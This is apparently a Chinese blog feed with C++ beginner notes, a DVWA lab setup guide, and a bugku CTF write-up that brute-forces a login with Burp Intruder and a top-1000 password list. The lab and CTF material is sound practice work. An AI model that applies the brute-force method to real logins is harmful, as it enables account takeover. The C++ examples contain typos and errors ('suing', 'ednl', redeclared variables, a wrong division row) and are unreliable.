<td>long（长整型）</td>
<td>Win为4字节，Linux为4字节（32位），8字节（64位）</td>
<td>（-2^31~2^31-1）</td>
</tr>
<tr>
<td>long long（长长整型）</td>
<td>8字节</td>
<td>（-2^63~2^63-1）</td>
</tr>
</tbody></table>
<p>sizeof可以求出数据类型所占内存大小</p>
<p>语法：<code>sizeof（数据类型/变量）</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line">suing <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">34</span>;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;int所占字节&quot;</span>&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;int所占字节&quot;</span>&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(a)&lt;&lt;endl;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    以上两种表达方式均可</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实型（浮点型）"><a href="#实型（浮点型）" class="headerlink" title="实型（浮点型）"></a>实型（浮点型）</h3><p>作用：用于表示小数</p>
<p>浮点型变量分为两种：</p>
<p>1.单精度float</p>
<p>用法：<code>float 变量名 = 数值f；</code>（没有f会默认为双精度，会多一部转换，转换为单精度）</p>
<p>2.双精度double</p>
<p>用法：<code>double 变量名 = 数值；</code></p>
<p>两者区别：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
<th>有效数字范围</th>
</tr>
</thead>
<tbody><tr>
<td>float</td>
<td>4字节</td>
<td>7位有效数字</td>
</tr>
<tr>
<td>double</td>
<td>8字节</td>
<td>15~16位有效数字</td>
</tr>
</tbody></table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">float</span> f1 = <span class="number">3.1415926f</span>;</span><br><span class="line">        cout&lt;&lt;f1&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(f1)&lt;&lt;endl;<span class="comment">//f1写为float也可</span></span><br><span class="line">    <span class="keyword">double</span> d1 = <span class="number">3.1415926</span>;</span><br><span class="line">        cout&lt;&lt;d1&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">double</span>)&lt;&lt;endl;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    C++默认显示6位有效数字</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面介绍科学计数法</span></span><br><span class="line">    <span class="keyword">double</span> d2 = <span class="number">3e2</span>;<span class="comment">//此处表示3*10^2</span></span><br><span class="line">    <span class="keyword">float</span> a2 = <span class="number">3e-2</span>;<span class="comment">//此处表示3*10^-2</span></span><br><span class="line">    cout&lt;&lt;d2&lt;&lt;a2&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><u>注意：C++输出小数默认显示6位有效数字，若想多显示，需要其他操作。</u></p>
<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>作用：用于表示<u>单个字母</u></p>
<p>用法：<code>char 变量名 = &#39;单个字母&#39;</code>（注意此处为单引号，） 也可以直接用<code>&#39;单个字母&#39;</code></p>
<p>注意：</p>
<ul>
<li>C和C++中字符型变量只占用1个字节</li>
<li>字符型变量并不是把字符本身放到内存中存储，而是把其对应的ASCII编码放入到存储单位</li>
</ul>
<p>例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> hl1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>)&lt;&lt;endl;<span class="comment">//输出其所占字符</span></span><br><span class="line">    	cout&lt;&lt;(<span class="keyword">int</span>)hl1&lt;&lt;endl;<span class="comment">//把字符型变量强转成整型，即a所对应ASCII码</span></span><br><span class="line">    <span class="keyword">char</span> hl2 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        cout&lt;&lt;(<span class="keyword">int</span>)hl2&lt;&lt;endl;</span><br><span class="line">    	cout&lt;&lt;(<span class="keyword">int</span>)<span class="string">&#x27;B&#x27;</span>&lt;&lt;endl;</span><br><span class="line">    	cout&lt;&lt;<span class="string">&#x27;C&#x27;</span>&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>作用：用于表示一些不能显示出来的ASCII字符</p>
<p>现阶段常用的转义字符有：<code>\n \\ \t</code></p>
<p><u>一定注意都是反斜杠</u></p>
<p>详情见下表</p>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>意义</th>
<th>ASCII码值（十进制）</th>
</tr>
</thead>
<tbody><tr>
<td><code>\a</code></td>
<td>响铃(BEL)</td>
<td>007</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>退格(BS) ，将当前位置移到前一列</td>
<td>008</td>
</tr>
<tr>
<td><code>\f</code></td>
<td>换页(FF)，将当前位置移到下页开头</td>
<td>012</td>
</tr>
<tr>
<td><strong><code>\n</code></strong></td>
<td><strong>换行(LF) ，将当前位置移到下一行开头</strong></td>
<td><strong>010</strong></td>
</tr>
<tr>
<td><code>\r</code></td>
<td>回车(CR) ，将当前位置移到本行开头</td>
<td>013</td>
</tr>
<tr>
<td><strong><code>\t</code></strong></td>
<td><strong>水平制表(HT)</strong></td>
<td><strong>009</strong></td>
</tr>
<tr>
<td><code>\v</code></td>
<td>垂直制表(VT)</td>
<td>011</td>
</tr>
<tr>
<td><code>\&#39;</code></td>
<td>单引号</td>
<td>039</td>
</tr>
<tr>
<td><code>\&quot;</code></td>
<td>双引号</td>
<td>034</td>
</tr>
<tr>
<td><strong><code>\\</code></strong></td>
<td><strong>反斜杠</strong></td>
<td><strong>092</strong></td>
</tr>
</tbody></table>
<p><img src="/2021/12/08/C-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/zyzf.png" alt="zyzf"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello \nworld\n&quot;</span>&lt;&lt;endl;<span class="comment">//  换行符/n要在双引号内</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\\&quot;</span>&lt;&lt;endl;<span class="comment">// 两个\\会输出一个\</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;&quot;hello\tworld&quot;&lt;&lt;endl;//水平制表符 \t总共8个位置，后面有多少空格取决于前面有多少字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    其优点就是使文字输出更整齐</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hel\tworld&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hell\tworld&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello\tworld&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>作用：用于表示一串字符</p>
<p>用法：</p>
<p>1.C风格的字符串：<code>char 变量名[] = &quot;变量值&quot;</code>（与字符型变量的区别在于变量名后面有 []，且变量值用双引号）</p>
<p>2.C++风格字符串：<code>string 变量名 = &quot;变量值&quot;</code>（该风格需要包含#include<string>头文件）</string></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hl[] = <span class="string">&quot;shl&quot;</span>;</span><br><span class="line">    cout&lt;&lt;hl&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    string hla = <span class="string">&quot;shl&quot;</span>;</span><br><span class="line">    cout&lt;&lt;hla&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>作用：布尔数据类型代表真或假的值</p>
<p>bool类型只有两个值</p>
<ul>
<li>true    真（本质为1）</li>
<li>false    假（本质为0）</li>
<li>除了0之外的数字都是真的，字母是假的。若数字后面有字母，则直接看数字，若字母后面有数字，则就是假</li>
</ul>
<p>用法：<code>bool 变量名 = true/false</code></p>
<p>bool类型只占一个字节</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> hl = <span class="literal">true</span>;</span><br><span class="line">    cout&lt;&lt;hl&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    hl = <span class="literal">false</span>;</span><br><span class="line">    cout&lt;&lt;hl&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数据的输入"><a href="#数据的输入" class="headerlink" title="数据的输入"></a>数据的输入</h2><p>作用：用于从键盘获取数据</p>
<p>用法：<code>cin&gt;&gt; 变量</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;你输入的数为&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> b = <span class="literal">false</span>;</span><br><span class="line">    cin&gt;&gt;b;<span class="comment">//除了0之外的数字都是真的，字母是假的。若数字后面有字母，则直接看数字，若字母后面有数字，则就是假</span></span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//也可这样用</span></span><br><span class="line">    <span class="keyword">int</span> b,c,d;</span><br><span class="line">    cin&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;c&lt;&lt;d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++运算符</title>
    <url>/2021/12/10/C-%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="1-运算符类型"><a href="#1-运算符类型" class="headerlink" title="1.运算符类型"></a>1.运算符类型</h1><p>运算运算符：用于四则运算</p>
<p>赋值运算符：用于表达式的值赋给变量</p>
<p>比较运算符：用于表达式的比较，并返回一个真值或假值</p>
<p>逻辑运算符：用于根据表达式的值返回真值或假值</p>
<span id="more"></span>

<h1 id="2-算术运算符"><a href="#2-算术运算符" class="headerlink" title="2.算术运算符"></a>2.算术运算符</h1><table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>正号</td>
<td>+3</td>
<td>3</td>
</tr>
<tr>
<td>-</td>
<td>负号</td>
<td>-3</td>
<td>-3</td>
</tr>
<tr>
<td>+</td>
<td>加</td>
<td>1+1</td>
<td>2</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
<td>1-1</td>
<td>0</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
<td>2*3</td>
<td>6</td>
</tr>
<tr>
<td>/</td>
<td>除</td>
<td>6*3</td>
<td>2</td>
</tr>
<tr>
<td>%</td>
<td>取模（取余）</td>
<td>5%3</td>
<td>2</td>
</tr>
<tr>
<td>++</td>
<td>前置递增</td>
<td>a=2;b=++a;</td>
<td>a=3;b=3;</td>
</tr>
<tr>
<td>++</td>
<td>后置递增</td>
<td>a=2;b=a++;</td>
<td>a=3;b=2;</td>
</tr>
<tr>
<td>–</td>
<td>前置递减</td>
<td>a=2;b=–a;</td>
<td>a=1;b=1;</td>
</tr>
<tr>
<td>–</td>
<td>后置递减</td>
<td>a=2;b=a–;</td>
<td>a=1;b=2;</td>
</tr>
</tbody></table>
<p>四则运算如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;a+b&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;a-b&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;a/b&lt;&lt;endl;<span class="comment">//C++规定，两个整数相除，结果仍然为整数，会舍去剩下的小数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> c = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">double</span> d = <span class="number">4.23</span>;<span class="comment">//此处也可写为    double c=3.14,d=4.23;</span></span><br><span class="line">    cout&lt;&lt;c/d&lt;&lt;endl;<span class="comment">//该结果为小数</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><u>除法运算和取模运算的除数不能为0</u></p>
<p>取模运算如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">4</span>,b=<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;a%b&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//注意：取模运算不能为小数</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前/后置递增/减如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> a = ++b*<span class="number">10</span>;<span class="comment">//先加1后参与运算</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">int</span> b =<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> c = b++*<span class="number">10</span>;<span class="comment">//先参与运算再加1</span></span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3.赋值运算符"></a>3.赋值运算符</h1><table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>=</td>
<td>赋值</td>
<td>a=2;b=3;</td>
<td>a=2;b=3;</td>
</tr>
<tr>
<td>+=</td>
<td>加等于</td>
<td>a=0;a+=2;</td>
<td>a=2;</td>
</tr>
<tr>
<td>-=</td>
<td>减等于</td>
<td>a=5;a-=3;</td>
<td>a=2;</td>
</tr>
<tr>
<td>*=</td>
<td>乘等于</td>
<td>a=2;a*=2;</td>
<td>a=4;</td>
</tr>
<tr>
<td>/=</td>
<td>除等于</td>
<td>a=4;a/=2;</td>
<td>a=2;</td>
</tr>
<tr>
<td>%=</td>
<td>模等于</td>
<td>a=3;a%=2;</td>
<td>a=1;</td>
</tr>
</tbody></table>
<p>详细使用方法如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a =<span class="number">0</span>;<span class="comment">//该处也可用 int a; 来引入变量a</span></span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;ednl;</span><br><span class="line">    </span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    a+=<span class="number">2</span>;<span class="comment">//表示a=a+2</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    a-=<span class="number">2</span>;<span class="comment">//表示a=a-2</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    a%=<span class="number">3</span>;<span class="comment">//表示a=a%3</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-比较运算符"><a href="#4-比较运算符" class="headerlink" title="4.比较运算符"></a>4.比较运算符</h1><p>作用：用于表达式的比较，并返回真假值</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>==</td>
<td>相等于</td>
<td>4==3</td>
<td>0</td>
</tr>
<tr>
<td>!=</td>
<td>不等于</td>
<td>4!=3</td>
<td>1</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
<td>4&lt;3</td>
<td>0</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
<td>4&gt;3</td>
<td>1</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
<td>4&lt;=3</td>
<td>0</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
<td>4&gt;=3</td>
<td>1</td>
</tr>
</tbody></table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">4</span>,b=<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;(a==b)&lt;&lt;endl;<span class="comment">//此处没有括号不对，括号表示优先运算，初学者可以看成一种语法</span></span><br><span class="line">    cout&lt;&lt;(a!=b)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;(a&gt;b)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;(a&lt;=b)&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-逻辑运算符"><a href="#5-逻辑运算符" class="headerlink" title="5.逻辑运算符"></a>5.逻辑运算符</h1><table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>!</td>
<td>非</td>
<td>!a</td>
<td>与a的真假相反</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>与</td>
<td>a&amp;&amp;b</td>
<td>a和b均为真时为真，否则为假</td>
</tr>
<tr>
<td>||</td>
<td>或</td>
<td>a||b</td>
<td>a和b中有一个真即为真，否则为假</td>
</tr>
</tbody></table>
<p>示例如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;!a&lt;&lt;endl;<span class="comment">//在C++中的数字，除了0其余都为真</span></span><br><span class="line">    cout&lt;&lt;!!a&lt;&lt;endl;<span class="comment">//该值为真，即为1</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">    cout&lt;&lt;(a&amp;&amp;b)&lt;&lt;endl;<span class="comment">//注意该处的优先运算括号</span></span><br><span class="line">    b=<span class="number">1</span>;</span><br><span class="line">    cout&lt;&lt;(a&amp;&amp;b)&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    a=<span class="number">1</span>,b=<span class="number">0</span>;</span><br><span class="line">    cout&lt;&lt;(a||b)&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPstudy+Win7搭建ＤＶＷＡ靶场</title>
    <url>/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="1-安装虚拟机"><a href="#1-安装虚拟机" class="headerlink" title="1.安装虚拟机"></a>1.安装虚拟机</h1><p>这里我用的时VMware，可以直接百度搜索，然后下载即可。之后要去找一个Win7的系统静像，这里推荐去<a href="https://msdn.itellyou.cn/"> I Tell You</a>下载。然后就是配置虚拟机</p>
<span id="more"></span>

<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174106598.png" alt="image-20211211174106598"></p>
<p>点击创建新的虚拟机，然后选定刚才下载的Win7静像，即可创建。创建完成后要进行VMware Tools的安装（目的是要实现与物理机的粘贴与复制），打开此处的设置</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174722062.png" alt="image-20211211174722062"></p>
<p>这里要将CD和软盘的连接都设置为 使用物理驱动器 </p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174757258.png" alt="image-20211211174757258"></p>
<p>然后进行VMware Tools的安装（如果不设置无法安装）。这里建议安装后为系统拍摄快照。</p>
<h1 id="2-安装PHPstudy和DVWA"><a href="#2-安装PHPstudy和DVWA" class="headerlink" title="2.安装PHPstudy和DVWA"></a>2.安装PHPstudy和DVWA</h1><p>安装之后直接直接在浏览器里面下载phpstudy，之后安装以下套件</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211181907791.png" alt="image-20211211181907791"></p>
<p>然后找到以下文件夹</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182353767.png" alt="image-20211211182353767"></p>
<p>将事先下载好的DVWA-master文件夹移入，然后打开文件夹的如下位置</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182626782.png" alt="image-20211211182626782"></p>
<p>并将里面文件复制后去掉.dist保存，再将其打开，修改其中数据：</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182721061.png" alt="image-20211211182721061"></p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182928405.png" alt="image-20211211182928405"></p>
<p>然后在浏览器中输入地址 ：<a href="http://127.0.0.1/DVWA-master/setup.php">http://127.0.0.1/DVWA-master/setup.php</a></p>
<p>拉到最下面点击按钮</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182947997.png" alt="image-20211211182947997"></p>
<p>之后进入登录页面</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211183019265.png" alt="image-20211211183019265"></p>
<p>账号：admin</p>
<p>密码：password</p>
<p>登录成功后即可进入</p>
]]></content>
      <tags>
        <tag>PHPstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku-bp</title>
    <url>/2021/12/05/bugku-bp/</url>
    <content><![CDATA[<p>根据题目提示，要用top1000密码</p>
<p><img src="/2021/12/05/bugku-bp/image-20211205185551656.png" alt="image-20211205185551656"></p>
<p>爆破结果如下</p>
<span id="more"></span>

<p><img src="/2021/12/05/bugku-bp/image-20211205185641750.png" alt="image-20211205185641750"></p>
<p>结果均为908，则猜想正确结果与错误结果的length一样，则选择其他参考标准，通过观察响应包里面的内容，我们发现错误包里面都会返回一个JavaScript代码告知我们的密码有错误。因此我们通过Burpsuite的 （Grep – Match 在响应中找出存在指定的内容的一项。）过滤掉存在JavaScript代码中的{code: ‘bugku10000’}的数据包。</p>
<p>添加如图内容，继续爆破</p>
<p><img src="/2021/12/05/bugku-bp/image-20211205185817178.png" alt="image-20211205185817178"></p>
<p>发现可疑点</p>
<p><img src="/2021/12/05/bugku-bp/image-20211205185906383.png" alt="image-20211205185906383"></p>
